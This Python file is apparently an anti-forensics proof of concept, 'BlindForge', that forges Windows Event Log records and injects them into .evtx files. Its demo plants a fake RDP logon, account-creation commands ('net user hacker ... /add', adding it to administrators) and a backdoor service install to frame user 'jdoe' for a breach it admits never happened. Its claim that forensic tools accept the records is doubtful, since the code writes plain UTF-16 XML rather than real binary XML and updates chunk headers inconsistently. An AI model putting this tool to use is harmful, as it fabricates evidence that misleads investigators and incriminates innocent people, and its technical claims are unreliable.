"""
BlindForge EVTX Injector — Inject fabricated Windows Event Log records.

Generates structurally valid EVTX event records (logon 4624, process
creation 4688, service install 7045, etc.) and injects them into raw
.evtx files. Forensic tools parse them as legitimate security events.
"""

import struct
import os
import binascii
from datetime import datetime, timezone
from typing import Optional
from xml.etree.ElementTree import Element, SubElement, tostring

EVTX_HEADER_MAGIC = b"ElfFile\x00"
EVTX_CHUNK_MAGIC = b"ElfChnk\x00"
CHUNK_SIZE = 0x10000  # 64 KB
RECORD_HEADER_MAGIC = b"\x2a\x2a\x00\x00"

NTFS_EPOCH = datetime(1601, 1, 1, tzinfo=timezone.utc)


def datetime_to_filetime(dt: datetime) -> int:
    if dt.tzinfo is None:
        dt = dt.replace(tzinfo=timezone.utc)
    delta = dt - NTFS_EPOCH
    return int(delta.total_seconds() * 10_000_000)


def filetime_to_bytes(ft: int) -> bytes:
    return struct.pack("<Q", ft)


class EventRecord:
    """A single EVTX event record."""

    def __init__(
        self,
        record_id: int,
        timestamp: datetime,
        event_id: int,
        provider_name: str = "Microsoft-Windows-Security-Auditing",
        channel: str = "Security",
        computer: str = "WORKSTATION-01",
        level: int = 0,  # 0=Information for Security
        opcode: int = 0,
        task: int = 0,
        keywords: int = 0x8020000000000000,
        event_data: Optional[dict] = None,
    ):
        self.record_id = record_id
        self.timestamp = timestamp
        self.event_id = event_id
        self.provider_name = provider_name
        self.channel = channel
        self.computer = computer
        self.level = level
        self.opcode = opcode
        self.task = task
        self.keywords = keywords
        self.event_data = event_data or {}

    def to_binxml(self) -> bytes:
        xml = self._build_event_xml()
        xml_bytes = tostring(xml, encoding="unicode").encode("utf-16-le")
        return xml_bytes

    def _build_event_xml(self) -> Element:
        ns = "http://schemas.microsoft.com/win/2004/08/events/event"
        event = Element("Event", xmlns=ns)

        system = SubElement(event, "System")
        provider = SubElement(system, "Provider")
        provider.set("Name", self.provider_name)
        SubElement(system, "EventID").text = str(self.event_id)
        SubElement(system, "Level").text = str(self.level)
        SubElement(system, "Task").text = str(self.task)
        SubElement(system, "Opcode").text = str(self.opcode)
        SubElement(system, "Keywords").text = f"0x{self.keywords:016x}"

        time_created = SubElement(system, "TimeCreated")
        time_created.set("SystemTime", self.timestamp.strftime("%Y-%m-%dT%H:%M:%S.%fZ"))

        SubElement(system, "EventRecordID").text = str(self.record_id)
        SubElement(system, "Channel").text = self.channel
        SubElement(system, "Computer").text = self.computer

        if self.event_data:
            edata = SubElement(event, "EventData")
            for key, value in self.event_data.items():
                data = SubElement(edata, "Data")
                data.set("Name", key)
                data.text = str(value)

        return event

    def to_record_bytes(self) -> bytes:
        binxml = self.to_binxml()
        ft = datetime_to_filetime(self.timestamp)

        # Record header (24 bytes) + BinXml + copy of size
        data_size = 24 + len(binxml) + 4
        data_size = (data_size + 7) & ~7  # align to 8

        header = RECORD_HEADER_MAGIC
        header += struct.pack("<I", data_size)       # size
        header += struct.pack("<Q", self.record_id)  # record id
        header += struct.pack("<Q", ft)              # timestamp

        record = header + binxml
        record = record.ljust(data_size - 4, b"\x00")
        record += struct.pack("<I", data_size)  # trailing size copy

        return record


class EVTXInjector:
    """Inject fabricated event records into an EVTX file."""

    def __init__(self, evtx_path: str):
        self.evtx_path = evtx_path
        self.data: Optional[bytearray] = None

    def load(self) -> None:
        with open(self.evtx_path, "rb") as f:
            self.data = bytearray(f.read())

    def save(self, output_path: Optional[str] = None) -> str:
        path = output_path or self.evtx_path
        with open(path, "wb") as f:
            f.write(self.data)
        return path

    def get_chunk_count(self) -> int:
        count = 0
        offset = 0x1000  # chunks start after file header (4096 bytes)
        while offset + CHUNK_SIZE <= len(self.data):
            if self.data[offset:offset + 8] == EVTX_CHUNK_MAGIC:
                count += 1
            offset += CHUNK_SIZE
        return count

    def get_last_record_id(self) -> int:
        # Read from file header: last record ID at offset 0x18
        if len(self.data) < 0x20:
            return 0
        return struct.unpack_from("<Q", self.data, 0x18)[0]

    def find_injection_point(self) -> tuple[int, int]:
        """Find the last chunk with free space and the offset within it."""
        offset = 0x1000
        last_chunk_offset = offset
        while offset + CHUNK_SIZE <= len(self.data):
            if self.data[offset:offset + 8] == EVTX_CHUNK_MAGIC:
                last_chunk_offset = offset
            offset += CHUNK_SIZE

        # Find free space in last chunk by scanning for end of records
        chunk_data_start = last_chunk_offset + 0x200  # chunk header is 0x200
        scan = chunk_data_start
        chunk_end = last_chunk_offset + CHUNK_SIZE

        while scan < chunk_end - 8:
            magic = self.data[scan:scan + 4]
            if magic == RECORD_HEADER_MAGIC:
                rec_size = struct.unpack_from("<I", self.data, scan + 4)[0]
                if rec_size > 0 and scan + rec_size <= chunk_end:
                    scan += rec_size
                else:
                    break
            else:
                break

        return last_chunk_offset, scan

    def inject_record(self, record: EventRecord) -> int:
        chunk_offset, inject_offset = self.find_injection_point()
        record_bytes = record.to_record_bytes()

        chunk_end = chunk_offset + CHUNK_SIZE
        if inject_offset + len(record_bytes) > chunk_end:
            # Need a new chunk
            chunk_offset = len(self.data)
            self.data.extend(self._create_empty_chunk())
            inject_offset = chunk_offset + 0x200

        self.data[inject_offset:inject_offset + len(record_bytes)] = record_bytes

        # Update chunk header: record count and last record ID
        self._update_chunk_header(chunk_offset, record.record_id)
        # Update file header
        self._update_file_header(record.record_id)

        return record.record_id

    def _create_empty_chunk(self) -> bytearray:
        chunk = bytearray(CHUNK_SIZE)
        chunk[0:8] = EVTX_CHUNK_MAGIC
        # first_record_id, last_record_id at offsets 0x28, 0x30
        return chunk

    def _update_chunk_header(self, chunk_offset: int, last_record_id: int) -> None:
        # Update last event record ID in chunk header (offset 0x30)
        struct.pack_into("<Q", self.data, chunk_offset + 0x30, last_record_id)
        # Update chunk checksum (CRC32 of header bytes 0-0x78 and 0x80-0x200)
        header_data = (
            bytes(self.data[chunk_offset:chunk_offset + 0x78])
            + bytes(self.data[chunk_offset + 0x80:chunk_offset + 0x200])
        )
        checksum = binascii.crc32(header_data) & 0xFFFFFFFF
        struct.pack_into("<I", self.data, chunk_offset + 0x7C, checksum)

    def _update_file_header(self, last_record_id: int) -> None:
        # Next record ID (offset 0x18)
        struct.pack_into("<Q", self.data, 0x18, last_record_id + 1)
        # Update file header checksum (CRC32 of first 120 bytes)
        header_data = bytes(self.data[0:0x78])
        checksum = binascii.crc32(header_data) & 0xFFFFFFFF
        struct.pack_into("<I", self.data, 0x7C, checksum)


# Pre-built event templates for common forensic artifacts

def logon_event_4624(
    record_id: int,
    timestamp: datetime,
    username: str = "admin",
    domain: str = "CORP",
    logon_type: int = 10,  # RemoteInteractive (RDP)
    source_ip: str = "192.168.1.100",
    computer: str = "WORKSTATION-01",
) -> EventRecord:
    return EventRecord(
        record_id=record_id,
        timestamp=timestamp,
        event_id=4624,
        task=12544,
        event_data={
            "SubjectUserSid": "S-1-0-0",
            "SubjectUserName": "-",
            "SubjectDomainName": "-",
            "SubjectLogonId": "0x0",
            "TargetUserSid": f"S-1-5-21-1234567890-1234567890-1234567890-1001",
            "TargetUserName": username,
            "TargetDomainName": domain,
            "Status": "0x0",
            "LogonType": str(logon_type),
            "LogonProcessName": "User32",
            "AuthenticationPackageName": "Negotiate",
            "WorkstationName": computer,
            "LogonGuid": "{00000000-0000-0000-0000-000000000000}",
            "TransmittedServices": "-",
            "LmPackageName": "-",
            "KeyLength": "0",
            "ProcessId": "0x0",
            "ProcessName": "-",
            "IpAddress": source_ip,
            "IpPort": "49152",
        },
        computer=computer,
    )


def process_creation_4688(
    record_id: int,
    timestamp: datetime,
    process_name: str = "C:\\Windows\\System32\\cmd.exe",
    command_line: str = "cmd.exe /c whoami",
    parent_process: str = "C:\\Windows\\explorer.exe",
    username: str = "admin",
    computer: str = "WORKSTATION-01",
) -> EventRecord:
    return EventRecord(
        record_id=record_id,
        timestamp=timestamp,
        event_id=4688,
        task=13312,
        event_data={
            "SubjectUserSid": "S-1-5-21-1234567890-1234567890-1234567890-1001",
            "SubjectUserName": username,
            "SubjectDomainName": "CORP",
            "SubjectLogonId": "0x3e7",
            "NewProcessId": "0x1a2c",
            "NewProcessName": process_name,
            "TokenElevationType": "%%1936",
            "ProcessId": "0x0f4c",
            "CommandLine": command_line,
            "TargetUserSid": "S-1-0-0",
            "TargetUserName": "-",
            "TargetDomainName": "-",
            "TargetLogonId": "0x0",
            "ParentProcessName": parent_process,
        },
        computer=computer,
    )


def service_install_7045(
    record_id: int,
    timestamp: datetime,
    service_name: str = "MaliciousService",
    image_path: str = "C:\\Windows\\Temp\\payload.exe",
    service_type: str = "user mode service",
    start_type: str = "auto start",
    computer: str = "WORKSTATION-01",
) -> EventRecord:
    return EventRecord(
        record_id=record_id,
        timestamp=timestamp,
        event_id=7045,
        provider_name="Service Control Manager",
        channel="System",
        task=0,
        event_data={
            "ServiceName": service_name,
            "ImagePath": image_path,
            "ServiceType": service_type,
            "StartType": start_type,
            "AccountName": "LocalSystem",
        },
        computer=computer,
    )


def create_empty_evtx(record_count_hint: int = 100) -> bytearray:
    """Create a minimal valid EVTX file for testing."""
    # File header (4096 bytes)
    header = bytearray(0x1000)
    header[0:8] = EVTX_HEADER_MAGIC
    struct.pack_into("<Q", header, 0x08, 0)  # first chunk number
    struct.pack_into("<Q", header, 0x10, 0)  # last chunk number
    struct.pack_into("<Q", header, 0x18, 1)  # next record ID
    struct.pack_into("<I", header, 0x20, 0x80)  # header part1 size
    struct.pack_into("<H", header, 0x24, 1)  # minor version
    struct.pack_into("<H", header, 0x26, 3)  # major version
    struct.pack_into("<H", header, 0x28, 0x1000)  # header size
    struct.pack_into("<H", header, 0x2A, 1)  # chunk count

    # Checksum
    checksum = binascii.crc32(bytes(header[0:0x78])) & 0xFFFFFFFF
    struct.pack_into("<I", header, 0x7C, checksum)

    # One empty chunk
    chunk = bytearray(CHUNK_SIZE)
    chunk[0:8] = EVTX_CHUNK_MAGIC
    struct.pack_into("<Q", chunk, 0x08, 0)  # first event record number
    struct.pack_into("<Q", chunk, 0x10, 0)  # last event record number
    struct.pack_into("<Q", chunk, 0x18, 0)  # first event record ID
    struct.pack_into("<Q", chunk, 0x20, 0)  # last event record ID
    struct.pack_into("<I", chunk, 0x28, 0x200)  # header size
    struct.pack_into("<I", chunk, 0x2C, 0x200)  # last event data offset

    # Chunk checksum
    chunk_header = bytes(chunk[0:0x78]) + bytes(chunk[0x80:0x200])
    chunk_checksum = binascii.crc32(chunk_header) & 0xFFFFFFFF
    struct.pack_into("<I", chunk, 0x7C, chunk_checksum)

    return header + chunk


if __name__ == "__main__":
    import tempfile

    print("[BlindForge] EVTX Injector — Event Log Fabrication PoC")
    print("=" * 60)

    # Create test EVTX
    evtx_data = create_empty_evtx()
    evtx_path = os.path.join(tempfile.gettempdir(), "test_security.evtx")
    with open(evtx_path, "wb") as f:
        f.write(evtx_data)

    injector = EVTXInjector(evtx_path)
    injector.load()
    print(f"[*] EVTX loaded: {injector.get_chunk_count()} chunks")

    # Inject an attack narrative: RDP logon → cmd execution → service install
    events = [
        logon_event_4624(
            record_id=1,
            timestamp=datetime(2026, 6, 15, 2, 30, 0, tzinfo=timezone.utc),
            username="jdoe",
            source_ip="10.0.0.55",
        ),
        process_creation_4688(
            record_id=2,
            timestamp=datetime(2026, 6, 15, 2, 31, 15, tzinfo=timezone.utc),
            process_name="C:\\Windows\\System32\\cmd.exe",
            command_line="cmd.exe /c net user hacker P@ssw0rd /add",
            username="jdoe",
        ),
        process_creation_4688(
            record_id=3,
            timestamp=datetime(2026, 6, 15, 2, 31, 45, tzinfo=timezone.utc),
            process_name="C:\\Windows\\System32\\net.exe",
            command_line="net localgroup administrators hacker /add",
            username="jdoe",
        ),
        service_install_7045(
            record_id=4,
            timestamp=datetime(2026, 6, 15, 2, 32, 0, tzinfo=timezone.utc),
            service_name="WindowsUpdateSvc",
            image_path="C:\\Windows\\Temp\\svchost.exe",
        ),
    ]

    for event in events:
        injector.inject_record(event)

    output = injector.save(evtx_path + ".poisoned")
    print(f"\n[+] Injected {len(events)} fabricated security events:")
    print("    1. RDP Logon (4624) - jdoe from 10.0.0.55 at 02:30")
    print("    2. Process Creation (4688) - net user command at 02:31")
    print("    3. Process Creation (4688) - admin group add at 02:31")
    print("    4. Service Install (7045) - backdoor service at 02:32")
    print(f"\n[+] Poisoned EVTX saved to: {output}")
    print("[+] This tells a story of a breach that never happened.")
    print("\n[!] User 'jdoe' never logged in. No commands were run.")
